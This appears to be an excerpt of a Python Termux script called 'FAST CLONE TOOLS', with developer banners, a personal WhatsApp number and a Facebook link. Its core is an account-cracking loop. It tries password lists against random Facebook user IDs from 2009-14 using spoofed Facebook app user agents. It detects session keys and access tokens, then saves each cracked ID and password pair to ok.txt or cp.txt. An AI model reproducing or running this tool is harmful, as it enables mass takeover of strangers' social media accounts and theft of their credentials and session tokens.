...
def helpnote():
	...
	exit(" [*] FACEBOOK :  https://www.facebook.com/M.ManikTmarRealAbbu.54390876")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +8801641340988")

	subprocess.check_output(["am", "start", "https://wa.me/+8801641340988"])
...
##     ## ##     ## ##    ## #### ##    ##
 ...
 > \033[0;92mDEVELOPER     : MANIK AHMED 

 > \033[0;95mFACEBOOK ID   : MD MANIK AHMED 

 > \033[0;41mWHATSAPP      : 01641340988

 \033[0;96m> GROUP         : TERMUX TECH BD

 > \033[0;97mWARNING       : DON'T MISS USE    

    """)

		print("%s [%s•%s] %sTOOL NAME : %sFAST CLONE TOOLS"%(G,R,G,B,G))
		...
		print("%s [%s1%s]%s CRACK RANDOM FB ID 2009-14 %s(FREE)"%(G,R,G,Y,B))
	...
	def api(self, uid, pwx):
		...
		ua = random.choice([
			...
			"Mozilla/5.0 (Linux; Android 12; SM-A536B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/374.0.0.20.109;]"

			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"

       "Mozilla/5.0 (Linux; Android 6.0; Micromax Q349) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36;]"

		])

		sys.stdout.write(

			"\r\r %s[>_] [MANIK] : %s/%s -> \033[0;92m [ MANIK-OK:%s ]- \033[0;93m[MANIK-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;92m[MANIK-OK] %s|%s\033[0;97m         "%(uid, pw))

				self.ok.append("%s|%s"%(uid, pw))

				open("ok.txt","a").write(" [MANIK-OK] %s|%s\n"%(uid, pw))
				...
				print("\r \033[0;93m[MANIK-CP] %s|%s\033[0;97m         "%(uid, pw))

				self.cp.append("%s|%s"%(uid, pw))

				open("cp.txt","a").write(" [MANIK-CP] %s|%s\n"%(uid, pw))
